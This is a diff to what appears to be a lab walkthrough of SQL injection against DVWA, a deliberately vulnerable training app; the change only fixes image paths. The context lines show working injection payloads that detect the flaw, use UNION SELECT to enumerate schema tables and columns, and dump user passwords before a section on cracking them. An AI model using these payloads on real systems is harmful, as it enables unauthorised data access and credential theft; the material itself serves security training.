@@ -27,7 +27,7 @@ Input: `1`
 
 Output:
 
-![image](images/sqli-dvwa-1.png)
+![image](/images/sqli-dvwa-1.png)
 
 #### Testing for error-based SQL injection
 
@@ -45,7 +45,7 @@ Input: `1' #`
 
 Output:
 
-![image](images/sqli-dvwa-2.png)
+![image](/images/sqli-dvwa-2.png)
 
 Injection vector found!
 
@@ -67,7 +67,7 @@ Input: `1' UNION SELECT 1,2 #`
 
 Output:
 
-![image](images/sqli-dvwa-3.png)
+![image](/images/sqli-dvwa-3.png)
 
 The UNION'd selection appends an additional entry to the output.
 
@@ -81,7 +81,7 @@ Input: `1' UNION SELECT DATABASE(),VERSION() #`
 
 Output:
 
-![image](images/sqli-dvwa-4.png)
+![image](/images/sqli-dvwa-4.png)
 
 ## 6. Enumerate tables
 
@@ -96,7 +96,7 @@ Input: `1' UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES W
 
 Output:
 
-![image](images/sqli-dvwa-5.png)
+![image](/images/sqli-dvwa-5.png)
 
 ## 7. Enumerate columns
 
@@ -111,7 +111,7 @@ Input: `1' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.COLUMNS W
 
 Output:
 
-![image](images/sqli-dvwa-6.png)
+![image](/images/sqli-dvwa-6.png)
 
 We have found the column where user passwords are stored!
 
@@ -123,7 +123,7 @@ Input: `1' UNION SELECT user,password FROM users #`
 
 Output:
 
-![image](images/sqli-dvwa-7.png)
+![image](/images/sqli-dvwa-7.png)
 
 ## 9. Cracking the passwords
 
